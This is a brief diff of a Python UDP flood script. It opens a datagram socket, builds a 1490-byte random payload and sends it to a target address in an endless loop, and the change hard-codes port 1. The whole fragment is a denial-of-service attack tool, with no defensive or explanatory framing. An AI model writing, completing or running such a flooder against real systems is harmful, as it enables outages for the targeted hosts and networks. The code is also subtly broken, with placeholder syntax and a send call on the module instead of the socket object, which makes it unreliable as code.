@@ -8,7 +8,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 data = random._urandom(1490)
 
 ip = <"SET_IP">
-port = <"SET_PORT">
+port = 1
 
 while True:
   socket.sendto(data, (ip,int(port))) 
